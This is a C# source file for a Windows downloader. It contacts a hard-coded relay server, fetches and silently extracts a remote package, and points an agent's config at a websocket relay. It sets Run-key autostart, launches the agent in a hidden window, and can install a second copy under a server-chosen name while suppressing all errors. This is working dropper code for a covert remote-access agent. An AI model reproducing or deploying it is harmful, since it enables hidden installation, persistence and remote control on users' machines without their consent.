using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

class Downloader {
    const string RELAY     = "https://aegis-relay-production.up.railway.app";
    const string RELAY_WSS = "wss://aegis-relay-production.up.railway.app";

    [STAThread]
    static void Main(string[] args) {
        bool created;
        new Mutex(true, "AegisDownloader_v1", out created);
        if (!created) return;
        try { Run(args.Length > 0 ? args[0] : ""); } catch { }
    }

    static void Run(string key) {
        // Derive key from own filename if not passed as arg
        if (string.IsNullOrEmpty(key)) {
            string fn = Path.GetFileNameWithoutExtension(
                System.Reflection.Assembly.GetExecutingAssembly().Location);
            fn = Regex.Replace(fn, @" \(\d+\)$", "");
            if (fn.StartsWith("downloader-")) key = fn.Substring("downloader-".Length);
        }

        // Fetch app names from relay
        string firstName  = "Support";
        string secondName = "";
        if (!string.IsNullOrEmpty(key)) {
            try {
                var wc = new WebClient();
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                string r = wc.UploadString(RELAY + "/api/key-meta",
                    "{\"key\":\"" + key + "\"}");
                firstName  = Json(r, "appName")  ?? "Support";
                secondName = Json(r, "appName2") ?? "";
            } catch { }
        }

        // Install dir = where this exe lives (placed there by the installer)
        string installDir = Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);

        // Get zip URL from relay
        string zipUrl = "";
        try {
            var wc = new WebClient();
            string r = wc.DownloadString(RELAY + "/api/app-package");
            zipUrl = Json(r, "url") ?? "";
        } catch { }
        if (string.IsNullOrEmpty(zipUrl)) return;

        // Download zip to temp
        string zipPath = Path.Combine(Path.GetTempPath(),
            "aegis-pkg-" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".zip");
        try {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
            var wc = new WebClient();
            wc.DownloadFile(zipUrl, zipPath);
        } catch { return; }

        // Extract silently into install dir
        try {
            using (var zip = ZipFile.OpenRead(zipPath)) {
                foreach (var entry in zip.Entries) {
                    if (string.IsNullOrEmpty(entry.Name)) continue;
                    string dest = Path.Combine(installDir,
                        entry.FullName.Replace('/', Path.DirectorySeparatorChar));
                    string dir = Path.GetDirectoryName(dest);
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    try { entry.ExtractToFile(dest, true); } catch { }
                }
            }
        } finally {
            try { File.Delete(zipPath); } catch { }
        }

        string mainExe = Path.Combine(installDir, "support.exe");
        if (!File.Exists(mainExe)) return;

        bool dual = !string.IsNullOrEmpty(secondName);

        // Write config for primary
        string cfgPath = Path.Combine(installDir, "resources", "app", "agent", "config.default.json");
        if (!string.IsNullOrEmpty(key) && File.Exists(cfgPath)) {
            string cfg = dual
                ? "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \"" + key
                  + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 1,\r\n  \"appName\": \""
                  + firstName + "\"\r\n}"
                : "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \"" + key
                  + "\",\r\n  \"enabled\": true\r\n}";
            try { File.WriteAllText(cfgPath, cfg); } catch { }
        }

        // Register autostart for primary
        string dataDir1 = dual ? Path.Combine(installDir, "userdata") : "";
        string runCmd = dual
            ? "\"" + mainExe + "\" --startup --user-data-dir=\"" + dataDir1 + "\""
            : "\"" + mainExe + "\" --startup";
        SetRun(firstName, runCmd);
        LaunchHidden(mainExe, dual
            ? "--startup --user-data-dir=\"" + dataDir1 + "\""
            : "--startup");

        // Second copy
        if (dual) {
            string dir2 = Path.Combine(
                Path.GetDirectoryName(installDir), secondName);
            Directory.CreateDirectory(dir2);
            CopyDir(installDir, dir2);

            string cfg2Path = Path.Combine(dir2, "resources", "app", "agent", "config.default.json");
            if (!string.IsNullOrEmpty(key) && File.Exists(cfg2Path)) {
                string cfg2 = "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \""
                    + key + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 2,\r\n  \"appName\": \""
                    + secondName + "\"\r\n}";
                try { File.WriteAllText(cfg2Path, cfg2); } catch { }
            }
            string exe2  = Path.Combine(dir2, "support.exe");
            string data2 = Path.Combine(dir2, "userdata");
            SetRun(secondName, "\"" + exe2 + "\" --startup --user-data-dir=\"" + data2 + "\"");
            LaunchHidden(exe2, "--startup --user-data-dir=\"" + data2 + "\"");
        }
    }

    static void CopyDir(string src, string dst) {
        foreach (var file in Directory.GetFiles(src, "*", SearchOption.AllDirectories)) {
            if (file.Contains(Path.DirectorySeparatorChar + "userdata" + Path.DirectorySeparatorChar)) continue;
            string rel  = file.Substring(src.Length).TrimStart(Path.DirectorySeparatorChar);
            string dest = Path.Combine(dst, rel);
            Directory.CreateDirectory(Path.GetDirectoryName(dest));
            try { File.Copy(file, dest, true); } catch { }
        }
    }

    static void SetRun(string name, string cmd) {
        try {
            var key = Registry.CurrentUser
                .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null) key.SetValue(name, cmd);
        } catch { }
    }

    static void LaunchHidden(string exe, string args) {
        try {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo {
                FileName        = exe,
                Arguments       = args,
                UseShellExecute = true,
                WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden
            });
        } catch { }
    }

    static string Json(string json, string key) {
        var m = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"([^\"]+)\"");
        return m.Success ? m.Groups[1].Value : null;
    }
}
